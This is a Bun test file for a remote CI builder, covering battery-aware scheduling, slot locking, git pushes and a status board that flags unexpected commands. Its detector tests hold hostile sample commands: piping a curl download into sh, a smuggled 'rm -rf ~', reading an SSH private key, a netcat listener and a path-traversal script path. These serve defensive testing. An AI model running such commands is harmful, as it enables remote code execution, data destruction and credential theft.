import { expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, utimesSync } from "node:fs";
import { tmpdir } from "node:os";
import { menu, readRuns } from "./builder-bar.ts";
import { board, events, expected, GATHER, parseShot, view, type Shot } from "./builder-board.ts";
import { battery, ciJobs, cutOff, jobScript, load, main, outcome, parseJobs, passedFile, passes, plan, pool, recordPass, remoteScript, snapshot, targetedJobs, TYPECHECK, type Valve } from "./remote-ci.ts";

const AC = "Now drawing from 'AC Power'\n -InternalBattery-0 (id=1)\t100%; charged; 0:00 remaining present: true";
const DRAIN = (pct: number) => `Now drawing from 'Battery Power'\n -InternalBattery-0 (id=1)\t${pct}%; discharging; 3:10 remaining present: true`;

// The valve, whether Bob answers, and his battery decide where a run goes and how many suites at once.
test.each<[Valve, boolean, string, string, number]>([
  ["on", true, AC, "bob", 4],
  ["on", false, "", "here", 4],
  ["off", true, AC, "bob", 4],
  ["off", false, "", "wait", 4],
  ["off", true, "", "bob", 4], // a Linux builder: no pmset
  ["off", true, DRAIN(50), "bob", 3], // on battery: up to three at once
  ["off", true, DRAIN(19), "wait", 4], // under 20%: nothing new starts
  ["off", true, DRAIN(12), "wait", 4], // past the cut-off too
  ["on", true, DRAIN(12), "here", 4],
  ["on", true, DRAIN(15), "here", 4],
  ["off", true, "Now drawing from 'AC Power'\n -InternalBattery-0 (id=1)\t12%; charging; 1:30 remaining", "bob", 4],
])("valve %s, Bob up %s: %#", (v, up, pmset, where, cap) => {
  expect(plan(v, up, battery(pmset), 4)).toMatchObject({ where, cap });
});

test("reads the touched suites and skips apps with no test command", () => {
  const out = `apps=${JSON.stringify({ include: [{ app: "a", test: "bun test", prep: "" }, { app: "b", test: "", prep: "" }] })}\nany=true\n`;
  expect(parseJobs(out).map((j) => j.app)).toEqual(["a"]);
  expect(() => parseJobs("any=false")).toThrow();
});

// `all` is what both required checks run, so a branch can be proven ready while GitHub is down.
test("all adds typecheck.yml, the touched root suites and each app's boot check", () => {
  const apps = { include: [{ app: "a", test: "bun test", prep: "", boot: true }, { app: "b", test: "", prep: "cargo x", boot: true }, { app: "c", test: "bun test", prep: "", boot: false }] };
  const out = `apps=${JSON.stringify(apps)}\nany=true\npackages=true\nhooks=false\nscripts=true\n`;
  expect(ciJobs(out).map((j) => [j.label, j.cmd])).toEqual([["a", "bun test"], ["c", "bun test"]]);
  expect(ciJobs(out, true).map((j) => [j.label, j.cmd])).toEqual([
    ["typecheck", TYPECHECK], ["packages", "bun test packages"], ["scripts", "bun test ./scripts"],
    ["a", "bun test && bun ../../scripts/boot.ts"], ["b", "cargo x && bun ../../scripts/boot.ts"], ["c", "bun test"],
  ]);
});

// The trust dial's targeted run: only the tests the diff changed, per app; an app whose tests it didn't change runs whole.
test("a targeted run folds an app's shards into its changed tests, and leaves an app with none whole", () => {
  const apps = { include: [
    { app: "a", test: "bun test ./test/x.test.ts", prep: "make", shard: "1/2" }, { app: "a", test: "bun test ./test/y.test.ts", prep: "make", shard: "2/2" },
    { app: "c", test: "bun test", prep: "" },
  ] };
  const out = `apps=${JSON.stringify(apps)}\nany=true\n`;
  const files = ["apps/a/src/m.ts", "apps/a/test/m.test.ts", "apps/c/src/n.ts", "README.md"];
  expect(targetedJobs(out, files).map((j) => [j.label, j.dir, j.cmd])).toEqual([["a", "apps/a", "make && bun test './test/m.test.ts'"], ["c", "apps/c", "bun test"]]);
});

test("a pass is written down per commit, and reads as moved once the branch has a newer commit", async () => {
  const dir = mkdtempSync(`${tmpdir()}/passed-`);
  process.env.BUILDER_PASSED = `${dir}/passed.jsonl`;
  try {
    const git = (...a: string[]) => Bun.$`git ${a}`.cwd(dir).quiet();
    await git("init", "-q", "-b", "office/x");
    await git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "one");
    const sha = (await git("rev-parse", "HEAD")).text().trim();
    await recordPass({ sha, branch: "office/x", base: "origin/main", at: 1, jobs: ["typecheck"] });
    await Bun.write(passedFile(), (await Bun.file(passedFile()).text()) + "not json\n");
    expect((await passes(dir)).map((p) => p.now === p.sha)).toEqual([true]);
    await git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "two");
    expect((await passes(dir)).map((p) => [p.branch, p.now === p.sha])).toEqual([["office/x", false]]);
  } finally {
    delete process.env.BUILDER_PASSED;
  }
});

test("the pool never runs more than the cap and returns the worst code", async () => {
  let live = 0, peak = 0;
  const worst = await pool([0, 1, 0, 2, 0, 0], 2, async (code) => {
    peak = Math.max(peak, ++live);
    await Bun.sleep(5);
    live--;
    return code;
  });
  expect(worst).toBe(2);
  expect(peak).toBe(2);
});

// The builder is a folder of slot clones; "ssh" is a script that runs the command in that folder's home.
// Each run leaves a record its menu bar reads: who and what while it runs, then how it ended.
test("a run waits until Bob serves, takes back a dead run's slot and ends what it left running, sends the working tree, shows on his menu, outlasts losing him mid-run, and a stray file in his locks doesn't jam a slot", async () => {
  const root = mkdtempSync(`${tmpdir()}/remote-ci-`), work = `${root}/work`, home = `${root}/home`;
  const id = { GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
  await Bun.write(`${work}/package.json`, `{"name":"w"}`);
  await Bun.$`git init -q && git add -A && git commit -qm one`.cwd(work).env({ ...process.env, ...id });
  await Bun.$`mkdir -p ${home}/builder/locks && git clone -q ${work} ${home}/builder/slot-1`;
  // The only slot is locked by a run that died ten minutes ago (no heartbeat since): this run takes it back, not waits.
  mkdirSync(`${home}/builder/locks/slot-1`);
  const dead = new Date(Date.now() - 10 * 60_000);
  utimesSync(`${home}/builder/locks/slot-1`, dead, dead);
  // ... and left a server running from the slot's node_modules (a `wrangler dev` that outlived its run by days, #5337)
  const leftover = Bun.spawn(["sh", "-c", "while :; do sleep 1; done", `${home}/builder/slot-1/node_modules/.bin/wrangler`], { stdout: "ignore" });
  // The first ssh fails (Bob off) and the valve is shut, so the run waits for the next one; a fake pmset says AC.
  const ssh = `${root}/ssh`, pmset = `${root}/bin/pmset`;
  await Bun.write(ssh, `#!/bin/sh\n[ -f "${root}/up" ] || { touch "${root}/up"; exit 255; }\nshift\nexport PATH="${root}/bin:$PATH"\ncd "${home}" && exec sh -c "$*"\n`);
  await Bun.write(pmset, `#!/bin/sh\necho "Now drawing from 'AC Power'"\n`);
  chmodSync(ssh, 0o755);
  chmodSync(pmset, 0o755);
  await Bun.write(`${root}/rb/valve`, "off\n");
  const saved = { ...process.env };
  Object.assign(process.env, id, { BUILDER_HOST: "max", BUILDER_SSH: ssh, GIT_SSH_VARIANT: "simple", RUSTYBUNS_HOME: `${root}/rb`, BUILDER_POLL_MS: "10", BUILDER_WHO: "byte" });
  const builder = `${home}/builder`;
  try {
    await Bun.write(`${work}/new.txt`, "hello");
    // Bob answers ssh but isn't serving yet: nothing is sent until `bun run builder serve` touches his `serving`
    setTimeout(() => void Bun.write(`${builder}/serving`, "now\n"), 300);
    // Mid-run, the slot is locked and its record is there: what the menu bar shows.
    expect(await main(["run", ".", "sh", "-c", `cat new.txt; cp -R ${builder} ${root}/mid`], work)).toBe(0);
    expect(await Bun.file(`${builder}/slot-1/new.txt`).text()).toBe("hello");
    expect(leftover.signalCode ?? await Promise.race([leftover.exited.then(() => leftover.signalCode), Bun.sleep(2000).then(() => "still running")])).toBe("SIGKILL");
    const mid = readRuns(`${root}/mid`);
    expect(mid.running.map((r) => [r.slot, r.who, r.cmd, r.last])).toEqual([["slot-1", "byte", expect.stringContaining(".: sh -c cat new.txt"), "hello"]]);
    expect(menu(mid, mid.running[0]!.started + 75_000).split("\n").slice(0, 3)).toEqual(["Bob: 1 running", "---", expect.stringMatching(/^slot-1 {2}byte {2}1m 15s \|/)]);

    // a late heartbeat once left a plain file where a released lock was: the slot is still taken, not jammed for good
    await Bun.write(`${builder}/locks/slot-1`, "");
    expect(await main(["run", ".", "sh", "-c", "echo nope; exit 1"], work)).toBe(1);
    // He goes away mid-run (ssh exits 255): the run waits for him again and runs from the start, not a failure
    expect(await main(["run", ".", "sh", "-c", `[ -f ${root}/dropped ] || { touch ${root}/dropped; exit 255; }; echo back`], work)).toBe(0);
    expect(readdirSync(`${builder}/locks`)).toEqual([]);
    const after = readRuns(builder);
    expect(after.running).toEqual([]);
    expect(after.done.map((r) => [r.code, r.last])).toEqual([[0, "back"], [1, "nope"], [0, "hello"]]);
    expect(menu(after, Date.now()).split("\n")[0]).toBe("Bob: idle");
    expect(await Bun.file(`${root}/up`).exists()).toBe(true);
    expect((await Bun.$`git status --porcelain`.cwd(work).text()).trim()).toBe("?? new.txt");
  } finally {
    process.env = saved;
  }
}, 30000);

// At 13% on battery, `serve`'s watcher cuts every running suite off: its shell, what that started and what that started
// are all gone, and the run reads "cut off" (it waits for Bob and starts over), not "failed". Nothing new starts in that slot.
test("Bob's battery at 13% kills a running suite's whole tree, and it reads cut off, not failed", async () => {
  const dir = realpathSync(mkdtempSync(`${tmpdir()}/cut-`)), nap = `sleep ${(60 + Math.random()).toFixed(4)}`;
  mkdirSync(`${dir}/slot-1/apps/x`, { recursive: true });
  mkdirSync(`${dir}/locks/slot-1`, { recursive: true });
  await Bun.write(`${dir}/runs/slot-1.json`, "{}");
  const job = Bun.spawn(["sh", "-c", jobScript("slot-1", "apps/x", `sh -c '${nap}; echo done'`)], { cwd: dir, stdout: "ignore", stderr: "ignore" });
  const running = async () => (await Bun.$`pgrep -f ${nap}`.quiet().nothrow().text()).split("\n").filter(Boolean);
  for (let i = 0; (await running()).length < 2 && i < 100; i++) await Bun.sleep(50);
  expect((await running()).length).toBe(2); // the child shell and its sleep
  expect(await cutOff(dir, DRAIN(14))).toEqual([]);
  expect(await cutOff(dir, DRAIN(13))).toEqual(["slot-1"]);
  expect(outcome(await job.exited)).toBe("cut off");
  expect(await running()).toEqual([]);
  expect(readdirSync(`${dir}/runs`)).toEqual(["slot-1.cut"]);
  const next = await Bun.$`sh -c ${jobScript("slot-1", "apps/x", "echo nope")}`.cwd(dir).quiet().nothrow();
  expect([outcome(next.exitCode), next.stdout.toString()]).toEqual(["cut off", ""]);
}, 15000);

// A push packs what the slot's refs don't reach. Once a run's commit stays there, the next run one commit on sends
// just that commit, not all the history since the slot was set up (seven 200 MB packs at once restarted the office Mac).
test("after a run the slot keeps its commit, so the next push packs only what is new", async () => {
  const root = mkdtempSync(`${tmpdir()}/remote-ci-push-`), work = `${root}/work`, slot = `${root}/builder/slot-1`, ssh = `${root}/ssh`;
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
  const commit = async (file: string, text: string) => {
    await Bun.write(`${work}/${file}`, text);
    return (await Bun.$`git add -A && git commit -qm ${file} && git rev-parse HEAD`.cwd(work).env(env).text()).trim();
  };
  await Bun.write(`${work}/package.json`, `{"name":"w"}`);
  await Bun.$`git init -q`.cwd(work);
  await commit("one.txt", "one");
  await Bun.$`git clone -q ${work} ${slot} && mkdir -p ${root}/builder/runs`;
  await Bun.write(ssh, `#!/bin/sh\nshift\ncd "${root}" && exec sh -c "$*"\n`);
  chmodSync(ssh, 0o755);
  const saved = { ...process.env };
  Object.assign(process.env, env, { GIT_SSH_VARIANT: "simple", RUSTYBUNS_HOME: `${root}/rb` });
  try {
    const two = await commit("big.txt", "x".repeat(1 << 20));
    expect(await load({ host: "max", dir: `${root}/builder`, ssh: [ssh] }, "slot-1", two, work)).toBe(0);
    const three = await commit("c.txt", "c");
    const shown = (await Bun.$`git for-each-ref ${"--format=%(objectname)"}`.cwd(slot).text()).trim().split("\n");
    const packed = (await Bun.$`git rev-list --objects ${three} --not ${shown}`.cwd(work).text()).trim().split("\n");
    expect(packed).toHaveLength(3); // its commit, its tree and c.txt; not big.txt again
    expect(readdirSync(`${root}/rb`)).toEqual([]); // the push lock is given back
  } finally {
    process.env = saved;
  }
}, 30000);

// Every agent works in a linked worktree, where git gives the index path in full, not relative to the folder.
test("a snapshot works from a linked worktree and sees its untracked files", async () => {
  const root = mkdtempSync(`${tmpdir()}/snap-`);
  const sh = (cwd: string, cmd: string) => Bun.$`sh -c ${cmd}`.cwd(cwd).quiet();
  await sh(root, "git init -q main && cd main && git -c user.name=t -c user.email=t@t commit -q --allow-empty -m init && git worktree add -q ../wt");
  await Bun.write(`${root}/wt/new.txt`, "hi");
  const commit = await snapshot(`${root}/wt`);
  expect((await sh(`${root}/main`, `git show ${commit}:new.txt`)).text()).toBe("hi");
});

// Valve open, and Bob off or no BUILDER_HOST: one command runs here with its own exit code, a base-ref run hands off to GitHub CI.
test.each([
  ["Bob off", { BUILDER_HOST: "bob", BUILDER_SSH: "false" }],
  ["no builder", { BUILDER_HOST: "" }],
])("%s: run runs here, a base ref points at GitHub CI", async (_, env) => {
  const saved = { ...process.env }, repo = `${import.meta.dir}/..`, rb = mkdtempSync(`${tmpdir()}/valve-`);
  await Bun.write(`${rb}/valve`, "on\n");
  Object.assign(process.env, env, { RUSTYBUNS_HOME: rb });
  try {
    expect(await main(["run", "scripts", "test", "-f", "remote-ci.ts"], repo)).toBe(0);
    expect(await main(["run", ".", "sh", "-c", "exit 3"], repo)).toBe(3);
    expect(await main(["HEAD"], repo)).toBe(0);
  } finally {
    process.env = saved;
  }
}, 30000);

// The builder board (builder-board.ts): what `bun run builder serve` shows on Bob, from the shells remote-ci starts there.
const shell = (slot: string, dir: string, cmd: string) => remoteScript({ dir: "builder" }, jobScript(slot, dir, cmd));

// The commands the builder runs every day pass; anything else is flagged with its whole command line.
test.each<[string, boolean]>([
  ["bun test test", true],
  ["bun run build:native && bun test --parallel test", true],
  ["bun test && bun ../../scripts/boot.ts", true],
  [TYPECHECK, true],
  ["'bun' 'test' 'test/foo.test.ts'", true],
  ["git checkout -q -f --detach abc123 && git update-ref refs/remote-ci/base abc123 && git update-ref -d refs/remote-ci/slot-1 && git clean -fdq && bun install --frozen-lockfile --silent", true],
  ["curl -fsSL https://example.com/x.sh | sh", false],
  ["bun test; rm -rf ~", false],
  ["bun install left-pad", false],
  ["bun scripts/../../../../tmp/x.ts", false],
  ["'sh' '-c' 'cat new.txt'", false],
  ["node -e 'require(1)'", false],
])("expected(%j) is %p", (cmd, ok) => {
  expect(expected(cmd)).toBe(ok);
});

const NOW = 1_800_000_000_000;
const shot = (over: Partial<Shot>): Shot => ({
  now: NOW, serving: NOW - 5_000, slots: [{ name: "slot-1", sha: "1a2b3c4d5e6f" }, { name: "slot-2", sha: "9f8e7d6c5b4a" }],
  locks: [], runs: [], waiting: [], done: [], batt: { onPower: true, pct: 100 }, procs: [], ...over,
});
const busy = (lockAge: number, logAge: number, cmd = "bun test test") => ({
  locks: [{ slot: "slot-1", at: NOW - lockAge }],
  runs: [{ who: "pixel-7c1a", cmd: "suites: fm-daw:2/3", started: NOW - 125_000, slot: "slot-1", logAt: NOW - logAge, last: "(pass) mixer > routes a bus" }],
  procs: [{ pid: 4242, secs: 120, script: shell("slot-1", "apps/fm-daw", cmd) }],
});
test.each<[string, Partial<Shot>, string[], string[]]>([
  ["a busy slot", busy(20_000, 3_000),
    ["slot-1", "pixel-7c1a", "1a2b3c4d", "2m 5s", "suites: fm-daw:2/3", "$ bun test test", "apps/fm-daw", "(pass) mixer > routes a bus", "free", "1 of 2 busy", "up to 4 suites at once"],
    ["STALLED", "UNEXPECTED"]],
  ["no heartbeat", busy(4 * 60_000, 3_000), ["STALLED no heartbeat for 4m 0s"], ["UNEXPECTED"]],
  ["no output", busy(20_000, 6 * 60_000), ["STALLED no output for 6m 0s"], []],
  ["an unexpected command in a slot", busy(20_000, 3_000, "curl -s https://example.com/x | sh"), ["UNEXPECTED", "pid 4242", "curl -s https://example.com/x | sh", "1 unexpected"], []],
  ["a shell that isn't a job", { procs: [{ pid: 7, secs: 3, script: `zsh -c ${remoteScript({ dir: "builder" }, "cat ~/.ssh/id_ed25519")}` }] }, ["UNEXPECTED", "pid 7", "cat ~/.ssh/id_ed25519"], []],
  ["waiting, finished and on battery", {
    batt: { onPower: false, pct: 54 },
    waiting: [{ who: "nib", cmd: "suites: eqosys", started: NOW - 90_000, at: NOW }, { who: "byte", cmd: "suites: qcrm", started: NOW - 30_000, at: NOW }],
    done: [{ who: "byte", cmd: "suites: wildclash", started: NOW - 200_000, ended: NOW - 158_000, code: 0 }, { who: "nib", cmd: ".: bun test x", started: NOW - 100_000, ended: NOW - 90_000, code: 1 }],
  }, ["on battery 54%", "up to 3 suites at once", "1. nib", "2. byte", "✓ pass", "42s", "wildclash", "✗ fail 1"], []],
])("the board shows %s", (_, over, has, hasnt) => {
  const text = board(view(shot(over)), { width: 100, color: false, frame: 0 });
  for (const s of has) expect(text).toContain(s);
  for (const s of hasnt) expect(text).not.toContain(s);
  expect(new Set(text.split("\n").map((l) => [...l].length))).toEqual(new Set([100]));
});

// The real gather script over a builder folder mid-run, then the plain log a pipe gets as the run moves on.
test("the board reads a builder folder, and a pipe gets one line per start, stall, finish and unexpected command", async () => {
  const dir = mkdtempSync(`${tmpdir()}/board-`);
  const old = (p: string, ms: number) => { const t = new Date(Date.now() - ms); utimesSync(`${dir}/${p}`, t, t); };
  await Bun.write(`${dir}/slot-1/.git/HEAD`, "1a2b3c4d5e6f7a8b9c0d1a2b3c4d5e6f7a8b9c0d\n");
  await Bun.write(`${dir}/slot-2/.git/HEAD`, "ffffffffffffffffffffffffffffffffffffffff\n");
  mkdirSync(`${dir}/locks/slot-1`, { recursive: true });
  await Bun.write(`${dir}/serving`, "now\n");
  await Bun.write(`${dir}/runs/slot-1.json`, JSON.stringify({ who: "pixel", cmd: "suites: qcrm", started: Date.now() - 60_000 }));
  await Bun.write(`${dir}/runs/slot-1.log`, "bun test v1\n\x1b[32m(pass)\x1b[0m deals > saves\n\n");
  await Bun.write(`${dir}/runs/wait/1-byte.json`, JSON.stringify({ who: "byte", cmd: "suites: eqosys", started: Date.now() - 10_000 }));
  await Bun.write(`${dir}/runs/done/5-slot-2.json`, JSON.stringify({ who: "nib", cmd: "suites: wildclash", started: 5, ended: 47_005, code: 0 }));
  const job = shell("slot-1", "apps/qcrm", "bun test test");
  await Bun.write(`${dir}/ps.txt`, [
    `  101   01:02 zsh -c ${job}`, `  102   01:01 zsh -c ${job}`, // the pipe's fork has the same command line
    "  103   00:01 /usr/sbin/cron", `  104 1-00:00:03 zsh -c ${remoteScript({ dir: "builder" }, "nc -l 4444")}`,
  ].join("\n") + "\n");
  const read = async () => view(parseShot(await Bun.$`sh -c ${GATHER}`.cwd(dir).env({ ...process.env, PS: `cat ${dir}/ps.txt` }).text()));

  const first = await read();
  expect(first.slots.map((s) => [s.name, s.busy, s.sha.slice(0, 8), s.run?.who, s.run?.last, s.jobs.map((j) => [j.pid, j.dir, j.cmd])])).toEqual([
    ["slot-1", true, "1a2b3c4d", "pixel", "(pass) deals > saves", [[101, "apps/qcrm", "bun test test"]]],
    ["slot-2", false, "ffffffff", undefined, undefined, []],
  ]);
  expect(first.shot.waiting.map((w) => w.who)).toEqual(["byte"]);
  expect(first.odd.map((o) => [o.pid, o.secs])).toEqual([[104, 86_403]]);
  expect(events(undefined, first)).toEqual(["start slot-1 pixel 1a2b3c4d: suites: qcrm", expect.stringMatching(/^UNEXPECTED pid 104: zsh -c .*nc -l 4444$/)]);

  old("locks/slot-1", 4 * 60_000);
  await Bun.write(`${dir}/runs/done/9-slot-1.json`, JSON.stringify({ who: "byte", cmd: "suites: eqosys", started: 9, ended: 3_009, code: 1 }));
  const second = await read();
  expect(events(first, second)).toEqual([expect.stringMatching(/^STALLED slot-1 pixel: no heartbeat for 4m/), "finish fail 1 byte in 3s: suites: eqosys"]);
});
